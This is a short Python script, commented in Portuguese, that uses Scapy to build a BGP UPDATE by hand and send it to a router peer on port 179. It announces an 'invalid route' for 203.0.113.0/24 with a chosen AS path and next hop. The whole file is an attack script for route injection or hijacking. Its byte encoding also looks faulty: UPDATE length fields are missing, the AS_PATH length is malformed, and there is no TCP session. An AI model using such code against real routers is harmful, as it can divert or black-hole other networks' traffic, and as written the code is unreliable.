from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.contrib.bgp import BGPHeader, BGPUpdate

# Criando atributos de caminho e informacoes de rota em formato de bytes
bgp_path_attr_as_path = b'\x40\x02\x00\x06\x02\x01\xfd\xe9'  # AS_PATH (ASN 65001)
bgp_path_attr_next_hop = b'\x40\x03\x04\xc0\xa8\x02\x68'  # NEXT_HOP (192.168.2.104)

# NLRI (prefixo)
nlri = b'\x18\xcb\x00\x71'  # Prefixo 203.0.113.0/24

# Construindo manualmente o pacote BGP Update em bytes
bgp_update = BGPHeader() / Raw(b'\x02' + bgp_path_attr_as_path + bgp_path_attr_next_hop + nlri)

# Criando pacote TCP/IP
src_ip = "192.168.2.104"
dst_ip = "192.168.2.105"
packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=179, dport=179, flags='PA') / bgp_update

# Enviando o pacote
send(packet, verbose=1)

print("Pacote BGP com rota invalida enviado.")
